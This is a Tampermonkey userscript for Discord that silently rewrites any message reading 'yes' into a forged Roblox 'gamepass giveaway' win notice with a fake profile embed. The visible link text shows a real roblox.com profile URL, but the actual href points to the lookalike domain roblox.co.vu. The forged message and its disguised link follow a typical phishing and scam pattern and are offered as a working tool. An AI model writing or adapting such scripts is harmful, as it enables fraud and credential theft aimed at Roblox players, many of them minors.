// ==UserScript==
// @name         Discord "yes" to Roblox Giveaway HTML
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Replace "yes" messages with HTML + Roblox embed
// @match        *://*.discord.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/545467/Discord%20%22yes%22%20to%20Roblox%20Giveaway%20HTML.user.js
// @updateURL https://update.greasyfork.org/scripts/545467/Discord%20%22yes%22%20to%20Roblox%20Giveaway%20HTML.meta.js
// ==/UserScript==

(function () {
    'use strict';

    const replacementHTML = `<div id="message-content-1403609067255103578" class="markup__75297 messageContent_c19a55" data-replaced="1"><span>Hello! You just won a gamepass giveaway! Choose any gamepass you want under 2k robux and join me to get it gifted. </span><a class="anchor_edefb8 anchorUnderlineOnHover_edefb8" href="https://roblox.co.vu/users/173719689/profile" target="_blank">https://www.roblox.com/users/173719689/profile</a></div>`;
    
    const embedHTML = `<div id="message-accessories-1403787320477487104" class="container_b7e1cb"><article class="embedFull__623de embed__623de markup__75297"><div class="gridContainer__623de"><div class="grid__623de hasThumbnail__623de"><div class="embedProvider__623de embedMargin__623de"><span>Roblox</span></div><div class="embedTitle__623de embedMargin__623de"><a class="anchor_edefb8" href="https://www.roblox.com/users/1770677206/profile" target="_blank">aFz_iReyxiee's Profile</a></div><div class="embedDescription__623de embedMargin__623de">aFz_iReyxiee is one of the millions creating and exploring the endless possibilities of Roblox. Join aFz_iReyxiee on Roblox and explore together!</div><div class="imageContent__0f481 embedThumbnail__623de"><div class="imageContainer__0f481"><div class="imageWrapper" style="width: 80px; height: 80px;"><a class="originalLink_af017a" href="https://tr.rbxcdn.com/30DAY-Avatar-6FB199DDEBB0D4A13318D53177663D44-Png/352/352/Avatar/Png/noFilter" target="_blank"><img src="https://images-ext-1.discordapp.net/external/-h7OOazWS7vinJ_WzOGAa1BRqwuy3vNmPP_RdlErfiU/https/tr.rbxcdn.com/30DAY-Avatar-6FB199DDEBB0D4A13318D53177663D44-Png/352/352/Avatar/Png/noFilter?format=webp&width=88&height=88" style="width:80px;height:80px;"></a></div></div></div></div></div></article></div>`;

    function replaceMessages(node) {
        if (!node || node.dataset?.processed === "1") return;
        const textNode = node.querySelector?.('[id^="message-content-"]');
        if (textNode && textNode.innerText.trim() === "yes") {
            textNode.innerHTML = replacementHTML;
            node.insertAdjacentHTML('beforeend', embedHTML);
            node.dataset.processed = "1";
        }
    }

    const observer = new MutationObserver(mutations => {
        for (const mutation of mutations) {
            mutation.addedNodes.forEach(addedNode => {
                if (addedNode.nodeType === 1) {
                    replaceMessages(addedNode);
                    addedNode.querySelectorAll?.('[class*="message_"]').forEach(replaceMessages);
                }
            });
        }
    });

    observer.observe(document.body, { childList: true, subtree: true });
})();
